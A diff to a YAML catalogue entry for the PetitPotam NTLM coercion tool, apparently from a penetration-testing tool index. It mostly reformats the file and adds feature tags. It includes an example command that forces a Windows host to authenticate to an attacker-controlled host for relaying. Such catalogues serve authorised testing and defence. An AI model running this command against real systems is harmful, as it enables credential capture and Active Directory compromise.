@@ -2,33 +2,43 @@
 trust_level: community
 id: wadcom-petitpotam
 namespace: wadcom:tool:petitpotam
-name: "PetitPotam"
-description: "PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger an authentication from the target host to an attacker controlled host (usually SMB or HTTP server). This captured authentication can then be relayed to authenticate to other hosts and perform more attacks. See more in ntlmrelayx.py."
-version: "1.0.0"
+name: PetitPotam
+description: PetitPotam leverages the MS-EFSRPC API to connect to a Windows host,
+  hijack the authentication session, and trigger an authentication from the target
+  host to an attacker controlled host (usually SMB or HTTP server). This captured
+  authentication can then be relayed to authenticate to other hosts and perform more
+  attacks. See more in ntlmrelayx.py.
+version: 1.0.0
 capabilities:
-  - network.coerce.authentication
+- network.coerce.authentication
 platforms:
-  - linux
+- linux
 techniques:
-  - credential-access
+- credential-access
 execution:
-  template: "petitpotam"
+  template: petitpotam
   sandbox: execFile
   timeout_seconds: 30
   shell: false
 examples:
-  - description: "Command execution"
-    command: "python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1"
+- description: Command execution
+  command: python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1
 references:
-  - label: "Reference 1"
-    url: "https://github.com/topotam/PetitPotam"
-  - label: "Reference 2"
-    url: "https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory"
+- label: Reference 1
+  url: https://github.com/topotam/PetitPotam
+- label: Reference 2
+  url: https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
 items:
-  - Hash
+- Hash
 services:
-  - RPC
-  - SMB
+- RPC
+- SMB
+features:
+- compression
+- file-system
+- network-intensive
+- pipes-stdout
+- remote
 ---
 
 # PetitPotam
